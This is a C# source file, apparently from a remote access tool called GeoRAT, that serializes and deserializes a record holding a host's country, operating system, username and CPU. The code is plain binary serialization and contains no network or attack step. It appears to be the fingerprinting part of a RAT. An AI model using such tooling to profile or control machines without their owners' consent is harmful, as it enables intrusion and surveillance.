
using System;
using System.IO;
using GeoRAT.Core.Interfaces;

namespace GeoRAT.Core.PacketStruct
{
    //This class implements IPacketSerializer interface and serializes Info class into byte[] array 
    //It also deserializes byte[] array back to Info 
   public class Serializer : IPacketSerializer<Info> 
    {

        public  byte[] Serialize(Info i)
        {
            using (MemoryStream stream = new MemoryStream())
            {
                using (BinaryWriter writer = new BinaryWriter(stream))
                {
                    writer.Write(i.Country);
                    writer.Write(i.OS);
                    writer.Write(i.UserName);
                    writer.Write(i.CPU);
                }
                return stream.ToArray();
            }

            
        }

        public Info Deserialize(byte[] buffer)
        {
            Info i = new Info();
            using (MemoryStream stream = new MemoryStream(buffer))
            {
                using (BinaryReader read = new BinaryReader(stream))
                {
                    i.Country = read.ReadString();
                    i.OS = read.ReadString();
                    i.UserName = read.ReadString();
                    i.CPU = read.ReadString();

                }
            }
            return i;
        }

       
    }
}
